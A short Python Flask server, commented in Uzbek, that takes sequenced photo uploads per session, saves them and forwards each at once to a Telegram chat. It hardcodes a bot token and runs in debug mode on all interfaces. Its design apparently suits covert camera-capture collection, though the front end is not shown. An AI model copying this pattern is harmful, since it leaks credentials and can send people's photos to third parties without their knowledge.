import os
import time
from flask import Flask, request, jsonify
from werkzeug.utils import secure_filename
import requests

app = Flask(__name__, static_folder='static')

UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

TELEGRAM_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN") or "7827433962:AAGkvZ4AyxHhQqfMnK6XCcJLfnbw1FOd3Nc"
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID") or "@ahadjonrasm"   # yoki kanal ID

@app.route('/')
def index():
    return app.send_static_file('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        # form-data: photo (file), session_id (optional), seq (optional), total (optional)
        session_id = request.form.get('session_id') or str(int(time.time()))
        seq = request.form.get('seq') or None

        file = request.files.get('photo')
        if not file:
            return jsonify(success=False, error="photo not provided"), 400

        # saqlash papkasi sessiyaga alohida
        session_dir = os.path.join(UPLOAD_DIR, secure_filename(session_id))
        os.makedirs(session_dir, exist_ok=True)

        if seq is not None:
            filename = secure_filename(f"{int(seq):03d}_" + (file.filename or f"{int(time.time())}.jpg"))
        else:
            filename = secure_filename((file.filename or f"{int(time.time())}.jpg"))

        path = os.path.join(session_dir, filename)
        file.save(path)

        # telegramga darhol yuborish
        try:
            send_photo_to_telegram(path, caption=f"📸 {session_id} - {filename}")
        except Exception as e:
            # Agar telegramga yuborishda xatolik bo'lsa, shunchaki xabar qaytaramiz (yoki log qilamiz)
            return jsonify(success=False, error="Telegramga yuborishda xatolik", details=str(e)), 500

        return jsonify(success=True, saved=path)
    except Exception as e:
        return jsonify(success=False, error=str(e)), 500

def send_photo_to_telegram(filepath, caption=None):
    send_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    with open(filepath, 'rb') as ph:
        resp = requests.post(
            send_url,
            data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption or ''},
            files={'photo': ph}
        )
    j = resp.json()
    if not j.get('ok'):
        raise Exception(f"Telegram error: {j}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8008, debug=True)
